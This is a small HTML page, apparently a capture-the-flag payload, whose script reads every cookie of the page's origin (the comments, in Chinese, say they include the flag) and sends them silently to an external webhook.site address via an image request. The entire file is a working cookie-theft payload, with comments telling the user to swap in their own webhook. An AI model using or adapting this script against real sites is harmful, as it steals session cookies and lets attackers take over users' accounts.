<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>leak cookie</title>
</head>
<body>
<script>
// 读取当前同源域名下全部cookie（nginx域，包含FLAG）
const cookie = document.cookie;
// 替换成你自己的webhook.site地址
const hook = "https://webhook.site/7963ed16-3ffa-4282-8328-93b97065c805";
// 拼接泄露链接，encodeURIComponent防止特殊字符截断cookie
const leakUrl = hook + "?data=" + encodeURIComponent(cookie);
// 创建图片GET请求带出数据，无弹窗、无交互、静默发送
new Image().src = leakUrl;
</script>
</body>
</html>
